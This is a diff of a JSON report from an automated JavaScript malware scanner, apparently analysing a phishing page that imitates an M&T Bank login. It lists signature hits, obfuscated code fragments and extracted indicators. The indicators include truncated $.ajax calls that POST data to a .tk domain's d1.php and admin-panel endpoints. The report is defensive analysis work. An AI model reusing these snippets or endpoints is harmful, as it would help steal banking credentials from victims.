@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1051,
+    "score": 1061,
     "sections": [
       {
         "auto_collapse": false,
@@ -16,7 +16,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"dataType\":\"JSON\",\"url\":\"https://folderdata021755.tk/d1.php\",\"type\":\"POST\",\"data\":{\"fn\":\"cli...\n\t\t$.ajax({\"url\":\"https://folderdata021755.tk/adminPanel/returnJson.php?session=127.0.0.1\",\"method\":\"GE...\n\t\t$.ajax({\"url\":\"https://folderdata021755.tk/adminPanel/returnJson.php?session=127.0.0.1\",\"method\":\"GE...",
+        "body": "JavaScript uses unescape() to decode an encoded string\n\t\tCalling unescape() no.: 1\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -26,14 +26,14 @@
           "heur_id": 3,
           "score": 10,
           "score_map": {
-            "ajax_network_request": 10
+            "unescape": 10
           },
           "signatures": {
-            "ajax_network_request": 1
+            "unescape": 1
           }
         },
         "tags": {},
-        "title_text": "Signature: AJAXNetworkRequest",
+        "title_text": "Signature: Unescape",
         "zeroize_on_tag_safe": false
       },
       {
@@ -82,6 +82,28 @@
       },
       {
         "auto_collapse": false,
+        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"dataType\":\"JSON\",\"url\":\"https://folderdata021755.tk/d1.php\",\"type\":\"POST\",\"data\":{\"fn\":\"cli...\n\t\t$.ajax({\"url\":\"https://folderdata021755.tk/adminPanel/returnJson.php?session=127.0.0.1\",\"method\":\"GE...\n\t\t$.ajax({\"url\":\"https://folderdata021755.tk/adminPanel/returnJson.php?session=127.0.0.1\",\"method\":\"GE...",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "ajax_network_request": 10
+          },
+          "signatures": {
+            "ajax_network_request": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: AJAXNetworkRequest",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
         "body": "JavaScript prepares a network request\n\t\tvar _0x1a3571=_0x33f5;(function(_0x4480ea,_0x3a2a81){var _0x560b13=_0x33f5,_0x282a51=_0x4480ea();whi...",
         "body_format": "TEXT",
         "classification": "TLP:W",
@@ -126,7 +148,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"onlinebanking.mtb.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://onlinebanking.mtb.com/login/mtbsignon\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/login/mtbsignon\"}, {\"ioc_type\": \"domain\", \"ioc\": \"usps.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"i.ibb.co\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://i.ibb.co/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif\"}, {\"ioc_type\": \"domain\", \"ioc\": \"folderdata021755.tk\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/d1.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/d1.php\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/ads.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ads.php\"}, {\"ioc_type\": \"ip\", \"ioc\": \"127.0.0.1\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/adminpanel/returnjson.php?session=127.0.0.1\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/adminpanel/returnjson.php?session=127.0.0.1\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"?load=1&session='+window['ip']\"}]",
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"onlinebanking.mtb.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://onlinebanking.mtb.com/login/mtbsignon\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/login/mtbsignon\"}, {\"ioc_type\": \"domain\", \"ioc\": \"usps.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"i.ibb.co\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://i.ibb.co/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif\"}, {\"ioc_type\": \"domain\", \"ioc\": \"folderdata021755.tk\"}, {\"ioc_type\": \"domain\", \"ioc\": \"cdn.jsdelivr.net\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://cdn.jsdelivr.net/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/d1.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/d1.php\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/ads.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ads.php\"}, {\"ioc_type\": \"ip\", \"ioc\": \"127.0.0.1\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/adminpanel/returnjson.php?session=127.0.0.1\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/adminpanel/returnjson.php?session=127.0.0.1\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"?load=1&session='+window['ip']\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 0,
@@ -145,7 +167,8 @@
                 "onlinebanking.mtb.com",
                 "usps.com",
                 "i.ibb.co",
-                "folderdata021755.tk"
+                "folderdata021755.tk",
+                "cdn.jsdelivr.net"
               ],
               "ip": [
                 "127.0.0.1"
@@ -153,6 +176,8 @@
               "uri": [
                 "https://onlinebanking.mtb.com/login/mtbsignon",
                 "https://i.ibb.co/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif",
+                "https://cdn.jsdelivr.net/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css",
+                "https://folderdata021755.tk",
                 "https://folderdata021755.tk/d1.php",
                 "https://folderdata021755.tk/ads.php",
                 "https://folderdata021755.tk/adminpanel/returnjson.php?session=127.0.0.1"
@@ -160,6 +185,7 @@
               "uri_path": [
                 "/login/mtbsignon",
                 "/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif",
+                "/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css",
                 "/d1.php",
                 "/ads.php",
                 "/adminpanel/returnjson.php?session=127.0.0.1",
@@ -201,7 +227,7 @@
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "2b4baabf25fccfafea989377ea7aa9ddf39baf9dc928e04ac61d1baea7091360"
+        "sha256": "0ccc6bb1d79361ba26b065f822964d428a9d7a2e3acb0987f0ac5b71453b1d81"
       }
     ]
   },
@@ -216,7 +242,7 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "ajax_network_request"
+          "unescape"
         ]
       },
       {
@@ -231,6 +257,13 @@
         "heur_id": 3,
         "signatures": [
           "network_request"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "ajax_network_request"
         ]
       },
       {
@@ -255,6 +288,11 @@
     ],
     "tags": {
       "network.static.domain": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "cdn.jsdelivr.net"
+        },
         {
           "heur_id": 2,
           "signatures": [],
@@ -284,6 +322,16 @@
         }
       ],
       "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://cdn.jsdelivr.net/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://folderdata021755.tk"
+        },
         {
           "heur_id": 2,
           "signatures": [],
@@ -335,6 +383,11 @@
           "heur_id": 2,
           "signatures": [],
           "value": "/login/mtbsignon"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css"
         },
         {
           "heur_id": 2,
